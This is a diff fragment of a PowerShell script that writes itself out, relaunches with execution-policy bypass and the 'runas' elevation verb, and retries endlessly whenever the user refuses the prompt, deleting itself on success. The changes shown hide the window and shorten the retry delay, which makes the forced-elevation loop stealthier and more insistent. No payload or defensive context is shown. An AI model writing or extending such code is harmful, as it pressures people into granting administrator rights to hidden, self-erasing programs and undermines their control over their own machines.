@@ -38,7 +38,7 @@ if (Test-Path -LiteralPath $launcher) {
 '@
     Set-Content -LiteralPath $self -Value $body -Encoding UTF8
 
-    $argLine = "-NoProfile -ExecutionPolicy Bypass -File `"$self`""
+    $argLine = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$self`""
 
     while ($true) {
         $psi = New-Object System.Diagnostics.ProcessStartInfo
@@ -46,14 +46,14 @@ if (Test-Path -LiteralPath $launcher) {
         $psi.Arguments       = $argLine
         $psi.Verb            = "runas"
         $psi.UseShellExecute = $true
-        $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Normal
+        $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
         try {
             $p = [System.Diagnostics.Process]::Start($psi)
             $p.WaitForExit()
             Remove-Item -LiteralPath $self -Force -ErrorAction SilentlyContinue
             exit
         } catch {
-            Start-Sleep -Milliseconds 150
+            Start-Sleep -Milliseconds 90
             continue
         }
     }
